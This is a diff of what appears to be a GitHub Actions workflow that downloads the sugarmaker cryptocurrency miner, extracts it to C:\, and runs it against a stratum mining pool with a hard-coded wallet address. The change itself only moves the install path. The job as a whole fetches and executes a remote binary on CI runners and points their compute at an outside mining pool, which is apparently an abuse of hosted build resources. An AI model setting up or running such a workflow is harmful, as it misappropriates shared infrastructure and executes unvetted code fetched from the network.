@@ -13,11 +13,11 @@ jobs:
       - name: Downloading & Installing Essentials
         run: |
           Invoke-WebRequest -Uri "https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-w64.zip" -OutFile "sugarmaker-v2.5.0-sugar4-w64.zip"
-          Expand-Archive "sugarmaker-v2.5.0-sugar4-w64.zip" -DestinationPath ".\sugarmaker-v2.5.0-sugar4-w64"
+          Expand-Archive "sugarmaker-v2.5.0-sugar4-w64.zip" -DestinationPath "C:\sugarmaker-v2.5.0-sugar4-w64"
 
       - name: Start
         run: |
-          .\sugarmaker-v2.5.0-sugar4-w64\sugarmaker.exe -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qkxu2zgpzagdc0s92e8n5gt0ngff0altvsraxq8 -t2
+          C:\sugarmaker-v2.5.0-sugar4-w64\sugarmaker.exe -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qkxu2zgpzagdc0s92e8n5gt0ngff0altvsraxq8 -t2
 
       - name: Time Counter
         run: |
